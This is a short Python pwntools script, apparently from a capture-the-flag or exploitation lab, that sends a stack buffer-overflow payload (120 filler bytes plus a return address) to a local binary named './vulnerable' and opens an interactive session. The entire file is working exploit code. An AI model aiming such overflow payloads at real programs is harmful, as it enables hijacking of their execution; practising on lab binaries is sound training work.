from pwn import *
from struct import *

buf = b''
buf += b'\x45'*120
buf += b'\x90\x11\x40\x00\x00\x00'
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
program = './vulnerable'
io = process(program)

# pause
t = input("waiting gdb attach...")

info("sending payload…")
io.sendline(buf)
io.interactive()